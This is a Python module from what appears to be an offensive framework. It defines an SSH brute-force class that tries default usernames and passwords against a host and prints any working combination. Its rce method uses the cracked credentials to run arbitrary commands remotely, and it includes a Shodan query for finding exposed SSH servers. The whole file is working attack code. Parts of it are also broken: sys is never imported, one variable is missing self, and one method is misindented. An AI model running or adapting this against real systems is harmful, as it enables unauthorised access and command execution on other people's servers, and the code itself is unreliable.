from .Exploit import Exploit
import paramiko
import socket
import time
from colorama import init, Fore

init()

class SshBrute(Exploit):
    name="SshBrute"

    userList = ["admin","root"] #,"user","oracle","test","john"]
    passlist = ["password","root","123456"] #,"abc123","admin","test","qwerty","testuser","oracle","web"]

    # initialize colorama

    GREEN = Fore.GREEN
    RED   = Fore.RED
    RESET = Fore.RESET
    BLUE  = Fore.BLUE

    def is_ssh_open(self,hostname, username, password):
        # initialize SSH client
        client = paramiko.SSHClient()
        # add to know hosts
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(hostname=hostname, username=username, password=password, timeout=3)
        except socket.timeout:
            # this is when host is unreachable
            print(f"{self.RED}[!] Host: {hostname} is unreachable, timed out.{self.RESET}")
            return False
        except paramiko.AuthenticationException:
            print(f"[!] Invalid credentials for {username}:{password}")
            return False
        except paramiko.SSHException:
            print(f"{self.BLUE}[*] Quota exceeded, retrying with delay...{self.RESET}")
            # sleep for a minute
            #time.sleep(60)
            return False
        except KeyboardInterrupt:
            sys.exit()
        except:
            pass
	#return self.is_ssh_open(hostname, username, password)
        else:
            # connection was established successfully
            print(f"{self.GREEN}[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{self.RESET}")
            return True

    def execute(self,ip):
        host = ip
        # brute-force
        for user in self.userList:
            for password in self.passlist:
                if self.is_ssh_open(host, user, password):
                    return True
        return False

    def rce(self,ip,command):
        host = ip
        # brute-force
        for user in self.userList:
            for password in passlist:
                if self.is_ssh_open(host, user, password):
                    ssh = paramiko.SSHClient()
                    ssh.connect(host, username=user, password=password)
                    ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command(command)
                    return ssh_stdin
        return False

        def getShodan(self):
            return "openssh port:22"
